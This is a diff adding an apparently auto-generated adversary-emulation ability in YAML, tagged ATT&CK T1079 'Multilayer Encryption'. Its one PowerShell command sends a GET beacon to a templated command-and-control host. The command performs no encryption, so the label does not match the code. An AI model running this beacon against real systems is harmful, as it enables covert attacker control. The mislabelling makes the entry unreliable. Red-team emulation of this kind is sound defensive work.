@@ -1,0 +1,13 @@
+- id: d186d36b-b2db-4892-b2c4-e609547606a4
+  name: Multilayer Encryption
+  description: Ability for Multilayer Encryption (ATT&CK T1079). Generated from Atomic
+    Red Team procedures; review and test safely before use. [AUTO-INFERRED SAFE STUB]
+  tactic: command-and-control
+  technique:
+    attack_id: T1079
+    name: Multilayer Encryption
+  platforms:
+    windows:
+      psh:
+        command: powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing
+          http://#{c2_host}:#{c2_port}/beacon?id=#{paw} -Method GET"
